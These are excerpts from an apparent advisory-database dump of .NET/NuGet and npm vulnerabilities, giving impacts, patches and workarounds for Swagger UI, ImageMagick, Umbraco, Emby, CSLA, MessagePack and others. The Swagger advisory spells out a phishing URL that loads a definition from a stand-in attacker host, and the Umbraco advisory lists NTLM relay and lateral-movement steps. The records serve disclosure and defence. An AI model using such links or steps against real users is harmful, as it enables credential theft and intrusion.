if I am affected?\n\nIf you have a runtime or SDK with a version listed, or an affected package listed in [affected software](#affected-software) or [affected packages](#affected-packages) , you're exposed to the vulnerability.\n\n### How do I fix the issue?\n\n* To fix the issue please install the latest version of .NET 8.0 or .NET 7.0 or .NET 6.0. If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET  SDKs.\n* If you have .NET 6.0 or greater installed, you can list the versions you have installed by running the `dotnet --info` command. You will see output like the following;\n\n```\n.NET Core SDK (reflecting any global.json):\n\n Version:   6.0.200\n Commit:    8473146e7d\n\nRuntime Environment:\n\n OS Name:     Windows\n OS Version:  10.0.18363\n OS Platform: Windows\n RID:         win10-x64\n Base Path:   C:\\Program Files\\dotnet\\sdk\\6.0.300\\\n\nHost (useful for support):\n\n  Version: 6.0.5\n  Commit:  8473146e7d\n\n.NET Core SDKs installed:\n\n  6.0.200 [C:\\Program Files\\dotnet\\sdk]\n\n.NET Core runtimes installed:\n\n  Microsoft.AspNetCore.App 6.0.5 [C:\\Program Files\\dotnet\\shared\\Microsoft.AspNetCore.App]\n  Microsoft.NETCore.App 6.0.5 [C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App]\n  Microsoft.WindowsDesktop.App 6.0.5 [C:\\Program Files\\dotnet\\shared\\Microsoft.WindowsDesktop.App]\n\nTo install additional .NET Core runtimes or SDKs:\n  https://aka.ms/dotnet-download\n```\n\n* If you're using .NET 8.0, you should download and install .NET 8.0.2  Runtime or .NET 8.0.102 SDK (for Visual Studio 2022 v17.8) from https://dotnet.microsoft.com/download/dotnet-core/8.0.\n* If you're using .NET 7.0, you should download and install Runtime 7.0.16 or SDK 7.0.116 (for Visual Studio 2022 v17.4) from https://dotnet.microsoft.com/download/dotnet-core/7.0.\n* If you're using .NET 6.0, you should download and install Runtime 6.0.27 or SDK 6.0.419 from https://dotnet.microsoft.com/download/dotnet-core/6.0.\n\n.NET 6.0, .NET 7.0 and, .NET 8.0 updates are also available from Microsoft Update. To access this either type \"Check for updates\" in your Windows search, or open Settings, choose Update & Security and then click Check for Updates.\n\nOnce you have installed the updated runtime or SDK, restart your apps for the update to take effect.\n\nAdditionally, if you've deployed [self-contained applications](https://docs.microsoft.com/dotnet/core/deploying/#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in .NET 8.0 or .NET 7.0 or .NET 6.0, please email details to secure@microsoft.com. Reports may qualify for the Microsoft .NET Core & .NET 5 Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at <https://aka.ms/corebounty>.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization.

severity vulnerability that affects PeterO.Cbor","details":"### Impact\nThe CBOR library supports optional tags that enable CBOR objects to contain references to objects within them. Versions earlier than 4.0 resolved those references automatically. While this by itself doesn't cause much of a security problem, a denial of service can happen if those references are deeply nested and used multiple times (so that the same reference to the same object occurs multiple times), and if the decoded CBOR object is sent to a serialization method such as `EncodeToBytes`, `ToString`, or `ToJSONString`, since the objects referred to are expanded in the process and take up orders of magnitude more memory than if the references weren't resolved.\n\nThe impact of this problem on any particular system varies.  In general, the risk is higher if the system allows users to send arbitrary CBOR objects without authentication, or exposes a remote endpoint in which arbitrary CBOR objects can be sent without authentication.\n\n### Patches\nThis problem is addressed in version 4.0 by disabling reference resolution by default.  Users should use the latest version of this library.\n\n### Workarounds\nSince version 3.6, an encoding option (`resolvereferences=true` or `resolvereferences=false`) in CBOREncodeOptions sets whether the CBOR processor will resolve these kinds of references when decoding a CBOR object.  Set `resolvereferences=false` to disable reference resolution.\n\nIn version 3.6, if the method used `CBORObject.Read()` or `CBORObject.DecodeFromBytes()` to decode a serialized CBOR object, call the overload that takes `CBOREncodeOptions` as follows:\n\n    CBORObject.DecodeFromBytes(bytes, new CBOREncodeOptions(\"resolvereferences=false\"));\n\nIn versions 3.5 and earlier, this issue is present only if the CBOR object is an array or a map.  If the application does not expect a decoded CBOR object to be an array or a map, it should check the CBOR object's type before encoding that object, as follows:\n\n    if (cbor.Type != CBORType.Array && cbor.Type != CBORType.Map) {\n       cbor.EncodeToBytes();\n    }\n\nAlternatively, for such versions, the application can use `WriteTo` to decode the CBOR object to a so-called \"limited memory stream\", that is, a `Stream` that throws an exception if too many bytes would be written.  How to write such a limited-memory stream is nontrivial and beyond the scope of this advisory.\n\n    using(var stream = new LimitedMemoryStream(100000)) { // Limit to 100000 bytes\n         cbor.WriteTo(stream);\n         return stream.ToBytes();\n    }\n\nTo check whether a byte array representing a CBOR object might exhibit this problem, check whether the array contains the byte 0xd8 followed immediately by either 0x19 or 0x1d.  This check catches all affected CBOR objects but may catch some non-affected CBOR objects (notably integers and byte strings).\n\n### References\n\nSee the Wikipedia article [Billion laughs

This enables robust demonstration capabilities on sites like `petstore.swagger.io`, `editor.swagger.io`, and similar sites, where users often want to see what their OpenAPI definitions would look like rendered.\n\nHowever, this functionality may pose a risk for users who host their own SwaggerUI instances. In particular, including remote OpenAPI definitions opens a vector for phishing attacks by abusing the trusted names/domains of self-hosted instances.\n\nAn example scenario abusing this functionality could take the following form:\n- `https://example.com/api-docs` hosts a version of SwaggerUI with `?url=` query parameter enabled.\n- Users will trust the domain `https://example.com` and the contents of the OpenAPI definition.\n- A malicious actor may craft a similar OpenAPI definition and service that responds to the defined APIs at `https://evildomain`.\n- Users mistakenly click a phishing URL like `https://example.com/api-docs?url=https://evildomain/fakeapi.yaml` and enters sensitive data via the \"Try-it-out\" feature.\n\nWe do want to stress that this attack vector is limited to scenarios that actively trick users into divulging sensitive information. The ease of this is highly contextual and, therefore, the threat model may be different for individual users and organizations. It is *not* possible to perform non-interactive attacks (e.g., cross-site scripting or code injection) through this mechanism.\n\n### Resolution \nWe've made the decision to [disable query parameters (#4872)](https://github.com/swagger-api/swagger-ui/issues/4872) by default starting with SwaggerUI version `4.1.3`. Please update to this version when it becomes available (**ETA: 2021 December**). Users will still be able to be re-enable the options at their discretion. We'll continue to enable query parameters on the Swagger demo sites.\n\n### Workaround\nIf you host a version of SwaggerUI and wish to mitigate this issue immediately, you are encouraged to add the following custom plugin code:\n\n```js\nSwaggerUI({\n  //  ...other configuration options,\n  plugins: [function UrlParamDisablePlugin() {\n    return {\n      statePlugins: {\n        spec: {\n          wrapActions: {\n            // Remove the ?url parameter from loading an external OpenAPI definition.\n            updateUrl: (oriAction) => (payload) => {\n              const url = new URL(window.location.href)\n              if (url.searchParams.has('url')) {\n                url.searchParams.delete('url')\n                window.location.replace(url.toString())\n              }\n              return oriAction(payload)\n            }\n          }\n        }\n      }\n    }\n  }],\n})\n```\n\n### Future UX work\n\nThrough the exploration of this issue, it became apparent that users may not be aware to which web server the Try-it-out function will send requests. While this information is currently presented at the top of the page, understanding may improve by displaying it closer to the \"Execute\" button where requests are actually made. We'll be exploring these UX improvements over the coming months and welcome community input. Please create a Feature Request under the GitHub Issue tab to start a conversation with us and the community.\n\n## Reflected XSS attack\n\n**Warning** in versions < 3.38.0, it is possible to combine the URL options (as mentioned above) with a vulnerability in DOMPurify (https://www.cvedetails.com/cve/CVE-2020-26870/) to create a reflected XSS vector. If your version of Swagger UI is older than 3.38.0, we suggest you upgrade or implement the workaround as mentioned above.\n","affected":[{"package":{"name":"swagger-ui","ecosystem":"npm","purl":"pkg:npm/swagger-ui"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"4.1.3"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/12/GHSA-qrmm-w75w-3wpx/GHSA-qrmm-w75w-3wpx.json"}},{"package":{"name":"swagger-ui-dist","ecosystem":"npm","purl":"pkg:npm/swagger-ui-dist"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"4.1.3"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/12/GHSA-qrmm-w75w-3wpx/GHSA-qrmm-w75w-3wpx.json"}},{"package":{"name":"swagger-ui-react","ecosystem":"npm","purl":"pkg:npm/swagger-ui-react"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"4.1.3"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/12/GHSA-qrmm-w75w-3wpx/GHSA-qrmm-w75w-3wpx.json"}},{"package":{"name":"Swashbuckle.AspNetCore.SwaggerUI","ecosystem":"NuGet","purl":"pkg:nuget/Swashbuckle.AspNetCore.SwaggerUI"},"ranges":[{"type":"ECOSYSTEM","events":[{"introduced":"0"},{"fixed":"6.3.0"}]}],"versions":["1.0.0","1.0.0--rc1","1.0.0-rc1","1.0.0-rc2","1.0.0-rc3","1.1.0","1.2.0","2.0.0","2.1.0","2.1.1","2.2.0","2.3.0","2.4.0","2.5.0","3.0.0","4.0.0","4.0.1","5.0.0","5.0.0-beta","5.0.0-rc1","5.0.0-rc2","5.0.0-rc3","5.0.0-rc4","5.0.0-rc5","5.1.0","5.2.0","5.2.1","5.3.0","5.3.1","5.3.2","5.3.3","5.4.0","5.4.1","5.5.0","5.5.1","5.6.0","5.6.1","5.6.2","5.6.3","6.0.0","6.0.1","6.0.2","6.0.3","6.0.4","6.0.5","6.0.6","6.0.7","6.1.0","6.1.1","6.1.2","6.1.3","6.1.4","6.1.5","6.2.0","6.2.1","6.2.2","6.2.3"],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/12/GHSA-qrmm-w75w-3wpx/GHSA-qrmm-w75w-3wpx.json"}}],"references":[{"type":"WEB","url":"https://github.com/swagger-api/swagger-ui/security/advisories/GHSA-qrmm-w75w-3wpx"},{"type":"WEB","url":"https://github.com/swagger-api/swagger-ui/issues/4872"},{"type":"WEB","url":"https://github.com/domaindrivendev/Swashbuckle.AspNetCore/commit/401c7cb81e5efe835ceb8aae23e82057d57c7d29"},{"type":"WEB","url":"https://github.com/swagger-api/swagger-ui/commit/01a3e55960f864a0acf6a8d06e5ddaf6776a7f76"},{"type":"PACKAGE","url":"https://github.com/swagger-api/swagger-ui"}],"database_specific":{"cwe_ids":["CWE-918"],"github_reviewed":true,"github_reviewed_at":"2021-12-09T17:49:08Z","nvd_published_at":null,"severity":"MODERATE"},"_metadata":{"fetched_at":"2025-12-14T06:21:31.122554Z","source":"nuget","ecosystem":"NuGet"}},{"schema_version":"1.7.3","id":"GHSA-ch6p-4jcm-h8vh","published":"2018-10-16T19:58:52Z","modified":"2024-12-05T05:37:59.757189Z","aliases":["CVE-2017-0248"],"summary":"Moderate

The System.Common.Drawing v4.7.0 is affected by a remote code execution vulnerability https://github.com/advisories/GHSA-ghhp-997w-qr28.\n\nThe real-world impact of this should be low, but users should be advised to upgrade to later versions of Akka.NET.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nThis issue is resolved in Akka.NET v1.4.46 and Akka.NET v1.5.0-alpha3.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nYou might be able to explicitly reference System.Configuration.ConfigurationManager's NuGet package and upgrade to 6.0.1 or later without upgrading Akka.NET, but it's probably best to upgrade Akka.NET itself.\n\n### References\n_Are there any links users can visit to find out more?_\n\nOriginal issue: https://github.com/akkadotnet/akka.net/issues/6226\nMSFT advisory: https://github.com/advisories/GHSA-ghhp-997w-qr28\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [the Akka.NET repository](https://github.com/akkadotnet/akka.net/issues/new)\n* Contact us on [the Akka.NET Discord](https://discord.gg/GSCfPwhbWP)\n","affected":[{"package":{"name":"Akka","ecosystem":"NuGet","purl":"pkg:nuget/Akka"},"ranges":[{"type":"ECOSYSTEM","events":[{"introduced":"0"},{"fixed":"1.4.46"}]}],"versions":["0.2.0-beta","0.2.1-beta","0.5.0","0.5.2","0.5.8","0.6.0","0.6.1","0.6.2","0.6.3","0.6.4","0.7.0","0.7.1","0.8.0","1.0.0","1.0.0-dev1504032244","1.0.1","1.0.2","1.0.3","1.0.4","1.0.5","1.0.6","1.0.7","1.0.8","1.1.0","1.1.1","1.1.2","1.1.3","1.2.0","1.2.1","1.2.2","1.2.3","1.3.0","1.3.1","1.3.10","1.3.11","1.3.12","1.3.13","1.3.14","1.3.15","1.3.16","1.3.17","1.3.18","1.3.19","1.3.2","1.3.3","1.3.4","1.3.5","1.3.6","1.3.7","1.3.8","1.3.9","1.4.0","1.4.0-beta1","1.4.0-beta2","1.4.0-beta3","1.4.0-beta4","1.4.1","1.4.1-rc1","1.4.1-rc2","1.4.1-rc3","1.4.10","1.4.11","1.4.12","1.4.13","1.4.14","1.4.15","1.4.16","1.4.17","1.4.18","1.4.19","1.4.2","1.4.20","1.4.21","1.4.21-beta1","1.4.22","1.4.23","1.4.24","1.4.25","1.4.26","1.4.27","1.4.28","1.4.29","1.4.3","1.4.30","1.4.31","1.4.32","1.4.33","1.4.34","1.4.35","1.4.36","1.4.37","1.4.38","1.4.39","1.4.4","1.4.40","1.4.41","1.4.42","1.4.43","1.4.44","1.4.45","1.4.5","1.4.6","1.4.7","1.4.8","1.4.9"],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/11/GHSA-gpv5-rp6w-58r8/GHSA-gpv5-rp6w-58r8.json"}},{"package":{"name":"Akka","ecosystem":"NuGet","purl":"pkg:nuget/Akka"},"ranges":[{"type":"ECOSYSTEM","events":[{"introduced":"1.5.0-alpha1"},{"fixed":"1.5.0-alpha3"}]}],"versions":["1.5.0-alpha1","1.5.0-alpha2"],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/11/GHSA-gpv5-rp6w-58r8/GHSA-gpv5-rp6w-58r8.json"}}],"references":[{"type":"WEB","url":"https://github.com/akkadotnet/akka.net/security/advisories/GHSA-gpv5-rp6w-58r8"},{"type":"PACKAGE","url":"https://github.com/akkadotnet/akka.net"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2022-11-22T00:13:44Z","nvd_published_at":null,"severity":"MODERATE"},"_metadata":{"fetched_at":"2025-12-14T06:21:31.108631Z","source":"nuget","ecosystem":"NuGet"}},{"schema_version":"1.7.3","id":"GHSA-w7jx-j77m-wp65","published":"2021-01-06T19:27:54Z","modified":"2024-12-03T06:09:21.304425Z","aliases":["CVE-2024-21911"],"related":["CVE-2024-21911"],"summary":"Cross-site scripting vulnerability in TinyMCE","details":"### Impact\nA cross-site scripting (XSS) vulnerability was discovered in the URL sanitization logic of the core parser. The vulnerability allowed arbitrary JavaScript execution when inserting a specially crafted piece of content into the editor using the clipboard or APIs. This impacts all users who are using TinyMCE 5.5.1 or lower.\n\n### Patches\nThis vulnerability has been patched in TinyMCE 5.6.0 by improved URL sanitization logic.\n\n### Workarounds\nTo work around this vulnerability, either:\n- Upgrade to TinyMCE 5.6.0 or higher\n- Manually sanitize `iframe`, `object` and `embed` URL attributes using a [TinyMCE node filter](https://www.tiny.cloud/docs/api/tinymce.html/tinymce.html.domparser/#addnodefilter).\n- Disable `iframe`, `object`, and `embed` elements in your content using the [invalid_elements](https://www.tiny.cloud/docs/configure/content-filtering/#invalid_elements) setting.\n\n#### Example: Sanitizing using a node filter\n```js\neditor.parser.addNodeFilter('iframe,object,embed', function(nodes) {\n  nodes.forEach(function(node) {\n    if (node.attributes) {\n      node.attributes.forEach(function(attr) {\n        var name = attr.name;\n        var value = attr.value;\n        // Sanitize the attribute value here or remove it entirely\n        var sanitizedValue = ...;\n        node.attr(name, santizedValue);\n      });\n    }\n  });\n});\n```\n\n#### Example: Using invalid_elements\n```js\ninvalid_elements: 'iframe,object,embed'\n```\n\n### Acknowledgements\nTiny Technologies would like to

allows untrusted data to lead to DoS attack due to hash collisions and stack overflow","details":"### Impact\n\nWhen this library is used to deserialize messagepack data from an untrusted source, there is a risk of a denial of service attack by an attacker that sends data contrived to produce hash collisions, leading to large CPU consumption disproportionate to the size of the data being deserialized.\n\nThis is similar to [a prior advisory](https://github.com/MessagePack-CSharp/MessagePack-CSharp/security/advisories/GHSA-7q36-4xx7-xcxf), which provided an inadequate fix for the hash collision part of the vulnerability.\n\n### Patches\n\nThe following steps are required to mitigate this risk.\n\n1. Upgrade to a version of the library where a fix is available. If upgrading from v1, check out [our migration guide](https://github.com/MessagePack-CSharp/MessagePack-CSharp/blob/master/doc/migration.md).\n1. Review the steps in [this previous advisory](https://github.com/MessagePack-CSharp/MessagePack-CSharp/security/advisories/GHSA-7q36-4xx7-xcxf) to ensure you have your application configured for untrusted data.\n\n### Workarounds\n\nIf upgrading MessagePack to a patched version is not an option for you, you may apply a manual workaround as follows:\n\n1. Declare a class that derives from `MessagePackSecurity`.\n2. Override the `GetHashCollisionResistantEqualityComparer<T>` method to provide a collision-resistant hash function of your own and avoid calling `base.GetHashCollisionResistantEqualityComparer<T>()`.\n3. Configure a `MessagePackSerializerOptions` with an instance of your derived type by calling `WithSecurity` on an existing options object.\n4. Use your custom options object for all deserialization operations. This may be by setting the `MessagePackSerializer.DefaultOptions` static property, if you call methods that rely on this default property, and/or by passing in the options object explicitly to any `Deserialize` method.\n\n### References\n\n- Learn more about best security practices when reading untrusted data with [MessagePack 1.x](https://github.com/MessagePack-CSharp/MessagePack-CSharp/tree/v1.x#security) or [MessagePack 2.x](https://github.com/MessagePack-CSharp/MessagePack-CSharp#security).\n- The .NET team's

The latter request wouldn't start however, and would return the first cached response immediately. This means that the second response (or later responses) may contain the same data as the first response, therefore leaking data from another authenticated endpoint.\n\nThe occurence of this is limited however. The Guild Wars 2 API doesn't use the `Expires` header on most (if not all) authenticated endpoints. This header is checked when caching responses.

Any later cleanup or reuse of `_drawInfo->font` re-frees or dereferences dangling memory.\n- `DestroyDrawInfo` and other setters (`Options::font`, `Image::font`) assume `_drawInfo->font` remains valid, so destruction or subsequent updates trigger crashes or heap corruption.\n\n```cpp\nif (family_.length() == 0)\n  {\n    _drawInfo->family=(char *) RelinquishMagickMemory(_drawInfo->font);\n    DestroyString(RemoveImageOption(imageInfo(),\"family\"));\n  }\n```\n\n- **CWE-416 (Use After Free):** `_drawInfo->font` is left dangling yet still reachable through the Options object.\n- **CWE-415 (Double Free):** DrawInfo teardown frees `_drawInfo->font` again, provoking allocator aborts.\n\n**Affected Versions**\n- Introduced by commit `6409f34d637a34a1c643632aa849371ec8b3b5a8` (“Added fontFamily to the Image class of Magick++”, 2015-08-01, blame line 313).\n- Present in all releases that include that commit, at least ImageMagick 7.0.1-0 and later (likely late 6.9 builds with Magick++ font family support as well). Older releases without `fontFamily` are unaffected.\n\n**Command Line Triggerability**\nThis vulnerability cannot be triggered from the command line interface. The bug is specific to the Magick++ C++ API, specifically the `Options::fontFamily()` method. The command-line utilities (such as `convert`, `magick`, etc.) do not expose this particular code path, as they operate through different internal mechanisms that do not directly call `Options::fontFamily()` with an empty string in a way that would trigger the use-after-free condition.\n\n**Proposed Fix**\n```diff\ndiff --git a/Magick++/lib/Options.cpp b/Magick++/lib/Options.cpp\n@@ void Magick::Options::fontFamily(const std::string &family_)\n-      _drawInfo->family=(char *) RelinquishMagickMemory(_drawInfo->font);\n+      _drawInfo->family=(char *) RelinquishMagickMemory(_drawInfo->family);\n```\nThis frees only the actual family string, leaving `_drawInfo->font` untouched. Optionally nulling `_drawInfo->font` when clearing `font()` itself maintains allocator

is vulnerable to an integer Overflow in TIM decoder leading to out of bounds read (32-bit only)","details":"### Summary\nThe TIM (PSX TIM) image parser in ImageMagick contains a critical integer overflow vulnerability in the `ReadTIMImage` function (`coders/tim.c`). The code reads `width` and `height` (16-bit values) from the file header and calculates `image_size = 2 * width * height` without checking for overflow.\nOn 32-bit systems (or where `size_t` is 32-bit), this calculation can overflow if `width` and `height` are large (e.g., 65535), wrapping around to a small value. This results in a small heap allocation via `AcquireQuantumMemory` and later operations relying on the dimensions can trigger an out of bounds read.\n### Vulnerable Code\nFile:

Vulnerable to Improper File Access and Credential Exposure in Dictionary Import Functionality","details":"### Impact\nDue to unsafe handling and deletion of temporary files during the dictionary upload process, an attacker with access to the backoffice can trigger predictable requests to temporary file paths. The application’s error responses (HTTP 500 when a file exists, 404 when it does not) allow the attacker to enumerate the existence of arbitrary files on the server’s filesystem. This vulnerability does not allow reading or writing file contents.\n\nIn certain configurations, incomplete clean-up of temporary upload files may additionally expose the NTLM hash of the Windows account running the Umbraco application. The direct impact of this vulnerability is therefore limited to confidentiality, which is reflected in its CVSS base score of 4.9\n\nWhile the CVSS Base Score captures only the immediate effect, the practical risk varies significantly based on hosting environment and identity configuration. Umbraco Cloud sites run under low-privilege, isolated Azure App Service worker identities, which mitigates the impact of any credential exposure. In contrast, self-hosted deployments could run Umbraco using privileged local or domain accounts. If such an account’s NTLM hash is disclosed, an attacker may be able to:\n- Perform NTLM relay attacks\n- Crack the hash offline to recover the underlying password\n- Authenticate as the compromised identity\n- Access internal systems trusted by that identity\n- Move laterally within the network\n- Potentially escalate to full domain compromise in weakly segmented environments\n\nThese outcomes are not part of the CVSS base score, which only rates the immediate confidentiality impact, but represent realistic downstream consequences for installations using elevated or widely-trusted service accounts. Self-hosted environments running Umbraco under privileged identities are therefore at significantly higher risk.\n\nVulnerability found and reported by Tomasz Holeksa at Pentest Limited\n\n### Patches\nThe issue has been patched in 13.12.1.\n\n### Workarounds\nThe issue can only be exploited by authorized backoffice accounts with access to the \"Translations\" section.","affected":[{"package":{"name":"Umbraco.Cms","ecosystem":"NuGet","purl":"pkg:nuget/Umbraco.Cms"},"ranges":[{"type":"ECOSYSTEM","events":[{"introduced":"10.0.0"},{"fixed":"13.12.1"}]}],"versions":["10.0.0","10.0.1","10.1.0","10.1.0-rc","10.1.0-rc2","10.1.1","10.2.0","10.2.0-rc","10.2.1","10.3.0","10.3.0-rc","10.3.1","10.3.2","10.4.0","10.4.0-rc","10.4.1","10.4.2","10.5.0","10.5.0-rc","10.5.1","10.6.0","10.6.0-rc","10.6.1","10.7.0","10.7.0-rc","10.8.0","10.8.0-rc","10.8.1","10.8.10","10.8.11","10.8.2","10.8.3","10.8.4","10.8.5","10.8.6","10.8.7","10.8.8","10.8.9","11.0.0","11.0.0-rc1","11.0.0-rc2","11.0.0-rc3","11.0.0-rc4","11.0.0-rc5","11.0.0-rc6","11.1.0","11.1.0-rc","11.2.0","11.2.0-rc","11.2.1","11.2.2","11.3.0","11.3.0-rc","11.3.1","11.4.0","11.4.0-rc","11.4.1","11.4.2","11.5.0","11.5.0-rc","12.0.0","12.0.0-rc1","12.0.0-rc2","12.0.0-rc3","12.0.0-rc4","12.0.0-rc5","12.0.1","12.1.0","12.1.0-rc","12.1.1","12.1.2","12.2.0","12.2.0-rc","12.3.0","12.3.0-rc","12.3.1","12.3.10","12.3.2","12.3.3","12.3.4","12.3.5","12.3.6","12.3.7","12.3.8","12.3.9","13.0.0","13.0.0-rc1","13.0.0-rc2","13.0.0-rc3","13.0.0-rc4","13.0.0-rc5","13.0.1","13.0.2","13.0.3","13.1.0","13.1.0-rc","13.1.1","13.10.0","13.10.0-rc","13.10.1","13.11.0","13.11.0-rc","13.11.0-rc2","13.12.0","13.12.0-rc","13.12.0-rc2","13.2.0","13.2.0-rc","13.2.1","13.2.2","13.3.0","13.3.0-rc","13.3.1","13.3.2","13.4.0","13.4.0-rc","13.4.0-rc2","13.4.1","13.5.0","13.5.0-rc","13.5.1","13.5.2","13.5.3","13.6.0","13.6.0-rc","13.6.0-rc2","13.7.0","13.7.0-rc","13.7.1","13.7.2","13.8.0","13.8.0-rc","13.8.1","13.9.0","13.9.0-rc","13.9.1","13.9.2","13.9.3"],"database_specific":{"last_known_affected_version_range":"<= 13.12.0","source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-hfv2-pf68-m33x/GHSA-hfv2-pf68-m33x.json"}}],"references":[{"type":"WEB","url":"https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-hfv2-pf68-m33x"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-66625"},{"type":"WEB","url":"https://github.com/umbraco/Umbraco-CMS/commit/7505efd433189037f46547932d4a8b603fd4a615"},{"type":"PACKAGE","url":"https://github.com/umbraco/Umbraco-CMS"}],"database_specific":{"cwe_ids":["CWE-200","CWE-377","CWE-552"],"github_reviewed":true,"github_reviewed_at":"2025-12-09T17:12:18Z","nvd_published_at":"2025-12-09T20:15:55Z","severity":"MODERATE"},"severity":[{"type":"CVSS_V3","score":"CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N"}],"_metadata":{"fetched_at":"2025-12-14T06:21:31.111100Z","source":"nuget","ecosystem":"NuGet"}},{"schema_version":"1.7.3","id":"GHSA-95fv-5gfj-2r84","published":"2025-12-08T16:25:53Z","modified":"2025-12-09T22:13:57.562848Z","aliases":["CVE-2025-64113"],"summary":"Emby Server API Vulnerability allowing to gain administrative access without precondition","details":"### Impact\n\nThis vulnerability affects all Emby Server versions - beta and stable up to the specified versions.\nIt allows an attacker to gain full administrative access to an Emby Server (for Emby Server administration, **not at the OS level**,).\nOther than network access, no specific preconditions need to be fulfilled for a server to be vulnerable.\n\n### Patches\n\n#### Quick Fix\n\nA quick fix will be rolled out via an update to one of the default-included Emby Server plugins.\nThis way is chosen because many users are updating their servers manually while plugin updates are typically configured to be applied automatically. This allows to get a patch deployed to a large amount of servers within a single day.\n\n#### Server Patches\n\nPatched versions for both, Emby Server stable and Emby Server beta are available now.\n\n**All Emby Server owners are strongly encouraged to apply those updates as soon as possible.**\n\n\n### Workarounds\n\n> [!NOTE]\n> These workarounds are OBSOLETE now. Please update Emby Server instead!\n\nAs and immediate remedy, it is possible to set restricted file system permissions on the `passwordreset.txt` file in the configuration folder of Emby Server. If it doesn't exist, users can create the file themselves or just call the ForgotPassword API once, which will create the file.\n\nOn Windows, users can set DENY permissions for \"Authenticated

affected by Remote Code Execution via WcfProxy (NetDataContractSerializer)","details":"### Impact\nVersions of CSLA .NET prior to version 6 allow the use of WcfProxy. WcfProxy uses the NetDataContractSerializer (NDCS) which has known vulnerabilities that can allow remote execution of code during deserialization. NDCS itself is considered obsolete, and you should avoid using WcfProxy or upgrade to CSLA 6 or higher where this issue does not exist.\n\n### Patches\nCSLA .NET version 6 and higher do not use WCF or NetDataContractSerializer.\n\n### Workarounds\nIf you are using a version CSLA .NET older than version 6, you should stop using WcfProxy in your data portal configuration. Doing this avoids the use of WCF and the NetDataContractSerializer, avoiding the vulnerability.","affected":[{"package":{"name":"Csla","ecosystem":"NuGet","purl":"pkg:nuget/Csla"},"ranges":[{"type":"ECOSYSTEM","events":[{"introduced":"0"},{"fixed":"6.0.0"}]}],"versions":["5.0.0","5.0.0-R19052204","5.0.0-R19080501","5.0.0-R19082107","5.0.0-R19082803","5.0.0-R19090201","5.0.0-R19091001","5.0.0-R19091005","5.0.0-R19091601","5.0.0-R19091701","5.0.1","5.1.0","5.1.0-R19101002","5.1.0-R19110101","5.1.0-R19110701","5.1.0-R19122302","5.1.0-R20011901","5.1.0-R20012001","5.1.0-R20012201","5.1.0-R20020503","5.1.0-R20020701","5.2.0","5.2.0-R20040904","5.2.0-R20042401","5.2.0-R20042901","5.2.0-R20050802","5.3.0","5.3.0-R20062901","5.3.1","5.3.1-R20082601","5.3.2","5.4.0","5.4.0-R20111002","5.4.0-R20111202","5.4.0-R20113004","5.4.1","5.4.1-R21011901","5.4.2","5.4.2-R21040501","5.5.0","5.5.0-R21070101","5.5.0-R21071901","5.5.1","5.5.1-R21080301","5.5.1-R21082202","5.5.2","5.5.2-R21101501","5.5.3","5.5.4","6.0.0-R22020902","6.0.0-R22022201","6.0.0-R22031601","6.0.0-R22040701","6.0.0-R22042501"],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-wq34-7f4g-953v/GHSA-wq34-7f4g-953v.json"}}],"references":[{"type":"WEB","url":"https://github.com/MarimerLLC/csla/security/advisories/GHSA-wq34-7f4g-953v"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-66631"},{"type":"WEB","url":"https://github.com/MarimerLLC/csla/issues/4001"},{"type":"WEB","url":"https://github.com/MarimerLLC/csla/pull/4018"},{"type":"PACKAGE","url":"https://github.com/MarimerLLC/csla"},{"type":"WEB","url":"https://learn.microsoft.com/en-us/dotnet/fundamentals/code-analysis/quality-rules/ca2310"}],"database_specific":{"cwe_ids":["CWE-502"],"github_reviewed":true,"github_reviewed_at":"2025-12-08T22:15:56Z","nvd_published_at":"2025-12-09T16:18:22Z","severity":"HIGH"},"severity":[{"type":"CVSS_V4","score":"CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:U"}],"_metadata":{"fetched_at":"2025-12-14T06:21:31.130539Z","source":"nuget","ecosystem":"NuGet"}},{"schema_version":"1.7.3","id":"MAL-2025-191611","published":"2025-12-01T12:53:57Z","modified":"2025-12-02T10:11:45.490534Z","summary":"Malicious code in netherеum.all (NuGet)","details":"\n---\n_-= Per source details.

